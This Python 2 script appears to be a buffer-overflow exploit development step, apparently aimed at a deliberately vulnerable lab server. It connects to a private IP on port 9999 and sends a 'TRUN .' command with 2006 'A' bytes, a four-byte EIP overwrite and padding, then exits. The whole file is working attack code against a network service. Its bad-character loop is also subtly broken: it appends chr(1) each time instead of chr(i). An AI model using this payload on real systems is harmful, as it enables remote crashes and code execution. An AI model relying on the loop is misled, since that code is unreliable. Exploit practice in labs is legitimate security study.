import socket
server = '192.168.47.135'
sport = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server,sport))
print (s.recv(1024))

bad_character = ''
for i in range (0,256):
    bad_character = bad_character + chr(1)
eip = '\x42\x42\x42\x42'

padding = "C" * (3000 - 2006 -4 - len(bad_character))
attack = ("A" * 2006 + eip + bad_character + padding)

s.send(("TRUN ." + attack + '\r\n'))
print (s.recv(1024))
s.send("EXIT\r\n")
print (s.recv(1024))
s.close()

